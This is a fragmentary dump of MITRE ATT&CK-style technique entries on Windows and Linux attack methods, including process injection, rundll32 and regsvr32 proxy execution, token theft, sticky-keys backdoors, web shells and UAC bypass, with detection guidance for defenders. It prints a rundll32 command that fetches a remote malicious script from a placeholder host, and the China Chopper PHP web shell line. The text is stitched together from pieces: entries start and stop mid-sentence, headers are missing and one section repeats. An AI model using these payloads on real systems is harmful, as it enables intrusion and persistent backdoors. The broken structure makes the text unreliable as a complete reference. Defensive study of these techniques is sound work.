        * '''Asynchronous Procedure Call''' (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is a variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * '''Thread Local Storage''' (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ===Mac and Linux===

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)
        *'''LD_PRELOAD, LD_LIBRARY_PATH''' (Linux), '''DYLD_INSERT_LIBRARIES''' (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        *'''Ptrace system calls''' can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        *'''/proc/[pid]/mem''' provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
        *'''VDSO hijacking''' performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Detection: Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Engame Process Injection July 2017)

        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.  (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using PowerShell with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

        Detection: Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments.

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking. (Citation: Carbon Black Squiblydoo Apr 2016)

        Detection: Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.

        The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

        Detection: Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.

    technique:
      name: Scripting
      description: |-
        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macos being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike.  (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Detection: Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as word.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

      description: "Adversaries can hide a program's true filetype by changing the
        extension of a file. With certain file types (specifically this does not work
        with .app extensions), appending a space to the end of a filename will change
        how the file is processed by the operating system. For example, if there is
        a Mach-O executable file called evil.bin, when it is double clicked by a user,
        it will launch Terminal.app and execute. If this file is renamed to evil.txt,
        then when double clicked by a user, it will launch with the default text editing
        application (not executing the binary). However, if the file is renamed to
        \"evil.txt \" (note the space at the end), then when double clicked by a user,
        the true file type is determined by the OS and handled appropriately and the
        binary will be executed (Citation: Mac Backdoors are back). \n\nAdversaries
        can use this feature to trick users into double clicking benign-looking files
        of any format and ultimately executing something malicious.\n\nDetection:
        It's not common for spaces to be at the end of filenames, so this is something
        that can easily be checked with file monitoring. From the user's perspective
        though, this is very hard to notice from within the Finder.app or on the command-line

      description: |-
        Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name Masquerading to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)

        Detection: Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.

      name: Trusted Developer Utilities
      description: "There are many utilities used for software development related
        tasks that can be used to execute code in various forms to assist in development,
        debugging, and reverse engineering. These utilities may often be signed with
        legitimate certificates that allow them to execute on a system and proxy execution
        of malicious code through a trusted process that effectively bypasses application
        whitelisting defensive solutions.\n\n===MSBuild===\n\nMSBuild.exe (Microsoft
        Build Engine) is a software build platform used by Visual Studio. It takes
        XML formatted project files that define requirements for building various
        platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can
        use MSBuild to proxy execution of code through a trusted Windows utility.
        The inline task capability of MSBuild that was introduced in .NET version
        4 allows for C# code to be inserted into the XML project file. (Citation:
        MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task.
        MSBuild.exe is a signed Microsoft binary, so when it is used this way it can
        execute arbitrary code and bypass application whitelisting defenses that are
        configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The
        Things Application Whitelisting Bypass)\n\n===DNX===\n\nThe .NET Execution
        Environment (DNX), dnx.exe, is a software development kit packaged with Visual
        Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation:
        Microsoft Migrating from DNX) DNX is not present on standard builds of Windows
        and may only be present on developer workstations using older versions of
        .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft.
        \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass
        application whitelist policies that do not account for DNX. (Citation: engima0x3
        DNX Bypass)\n\n===RCSI===\n\nThe rcsi.exe utility is a non-interactive command-line
        interface for C# that is similar to csi.exe. It was provided within an early
        version of the Roslyn .NET Compiler Platform but has since been deprecated
        for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe
        binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx
        script files can be written and executed with rcsi.exe at the command-line.
        An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass
        application whitelisting policies that do not account for execution of rcsi.exe.
        (Citation: engima0x3 RCSI Bypass)\n\n===WinDbg/CDB===\n\nWinDbg is a Microsoft
        Windows kernel and user-mode debugging utility. The Microsoft Console Debugger
        (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows
        software development kits and can be used as standalone tools. (Citation:
        Microsoft Debugging Tools for Windows) They are commonly used in software
        development and reverse engineering and may not be found on typical Windows
        systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn
        adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code
        to bypass application whitelist policies that do not account for execution
        of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible
        to use other debuggers for similar purposes, such as the kernel-mode debugger
        kd.exe, which is also signed by Microsoft.\n\n===Tracker===\n\nThe file tracker
        utility, tracker.exe, is included with the .NET framework as part of MSBuild.
        It is used for logging calls to the Windows file system. (Citation: Microsoft
        Docs File Tracking)\n\nAn adversary can use tracker.exe to proxy execution
        of an arbitrary DLL into another process. Since tracker.exe is also signed
        it can be used to bypass application whitelisting solutions. (Citation: Twitter
        SubTee Tracker.exe)\n\nDetection: The presence of these or other utilities
        that enable proxy execution that are typically used for development, debugging,
        and reverse engineering on a system that is not used for these purposes may
        be suspicious.\n\nUse process monitoring to monitor the execution and arguments
        of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare
        recent invocations of those binaries with prior history of known good arguments
        and executed binaries to determine anomalous and potentially adversarial activity.
        It is likely that these utilities will be used by software developers or for
        other software development related tasks, so if it exists and is used outside
        of that context, then the event may be suspicious. Command arguments used
        before and after invocation of the utilities may also be useful in determining
        the origin and purpose of the binary being executed.\n\nPlatforms: Windows\n\nData

    technique:
      name: Access Token Manipulation
      description: "Windows uses access tokens to determine the ownership of a running
        process.  A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        \ When this occurs, the process also takes on the security context associated
        with the new token.  For example, Microsoft promotes the use of access tokens
        as a security best practice.  Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>.  (Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing.  An adversary must already be
        in a privileged user context (i.e. administrator) to steal a token.  However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system. (Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n'''Token
        Impersonation/Theft''' - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n'''Create Process
        with a Token''' - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n'''Make
        and Impersonate Token''' - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges.  (Citation: Metasploit
        access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens.  (Citation: Cobalt Strike Access Token)\n\nDetection:
        If an adversary is using a standard command-line shell, analysts can detect
        token manipulation by auditing command-line activity.  Specifically, analysts
        should look for use of the <code>runas</code> command. Detailed command-line
        logging is not enabled by default in Windows. (Citation: Microsoft Command-line
        Logging)\n\nIf an adversary is using a payload that calls the Windows token
        APIs directly, analysts can detect token manipulation only through careful
        analysis of user network activity, examination of running processes, and correlation
        with other endpoint and network behavior.  \n\nThere are many Windows API
        calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>
        (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code> (Citation:
        Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code> (Citation:
        Microsoft ImpersonateLoggedOnUser)).  Please see the referenced Windows API
        pages for more information.\n\nQuery systems for process and thread token
        information and look for inconsistencies such as user owns processes impersonating
        the local SYSTEM account. (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nPlatforms:

      name: Accessibility Features
      description: |-
        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        *On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        *Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        *Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        *Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
        *App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

        Detection: Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>.

      name: Web Shell
      description: |-
        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

        Web shells may serve as Redundant Access or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

        Detection: Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

        <code><?php @eval($_POST['password']);></code>

        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

      name: Application Shimming
      description: |-
        The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow backward compatibility of programs as Windows updates and changes its code. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Engame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses Hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

        * <code>%WINDIR%\AppPatch\sysmain.sdb</code>
        * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

        Custom databases are stored in:

        * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code>
        * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

        To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to Hooking, utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.

        Detection: There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

        * Shim-Process-Scanner - checks memory of every running process for any Shim flags
        * Shim-Detector-Lite - detects installation of custom shim databases
        * Shim-Guard - monitors registry for any shim installations
        * ShimScanner - forensic tool to find active shims in memory
        * ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

        Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.

      name: Bypass User Account Control
      description: |-
        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

        Detection: There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:

        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

      name: Hooking
      description: |-
        Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:
        * '''Hooks procedures''', which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Engame Process Injection July 2017)
        * '''Import address table (IAT) hooking''', which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Engame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
        * '''Inline hooking''', which overwrites the first bytes in an API function to redirect code flow. (Citation: Engame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

        Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

        Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

        Hooking is commonly utilized by Rootkits to conceal files,

        Detection: Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

      name: Image File Execution Options Injection
      description: |-
        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger Values in the Registry under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable></code> and <code> HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> </code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Engame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        Detection: Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Monitor the IFEOs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.

        Services) A service's configuration information, including the file path to
        the service's executable, is stored in the Windows Registry. \n\nAdversaries
        may install a new service that can be configured to execute at startup by
        using utilities to interact with services or by directly modifying the Registry.
        The service name may be disguised by using a name from a related operating
        system or benign software with Masquerading. Services may be created with
        administrator privileges but are executed under SYSTEM privileges, so an adversary
        may also use a service to escalate privileges from administrator to SYSTEM.
        Adversaries may also directly start services through Service Execution.\n\nDetection:
        Monitor service creation through changes in the Registry and common utilities
        using command-line invocation. New, benign services may be created during
        installation of new software. Data and events should not be viewed in isolation,
        but as part of a chain of behavior that could lead to other activities, such
        as network connections made for Command and Control, learning details about
        the environment through Discovery, and Lateral Movement.\n\nTools such as
        Sysinternals Autoruns may also be used to detect system changes that could
        be attempts at persistence. (Citation: TechNet Autoruns) Look for changes
        to services that do not correlate with known software, patch cycles, etc.
        Suspicious program execution through services may show up as outlier processes
        that have not been seen before when compared against historical data.\n\nMonitor
        processes and command-line arguments for actions that could create services.
        Remote access tools with built-in features may interact directly with the
        Windows API to perform these functions outside of typical system utilities.
        Services may also be created through Windows system management tools such

      name: Process Injection
      description: |-
        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ===Windows===

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Engame Process Injection July 2017)
        * '''Dynamic-link library (DLL) injection''' involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * '''Portable executable injection''' involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * '''Thread execution hijacking''' involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.
        * '''Asynchronous Procedure Call''' (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is a variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * '''Thread Local Storage''' (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ===Mac and Linux===

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)
        *'''LD_PRELOAD, LD_LIBRARY_PATH''' (Linux), '''DYLD_INSERT_LIBRARIES''' (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        *'''Ptrace system calls''' can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        *'''/proc/[pid]/mem''' provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
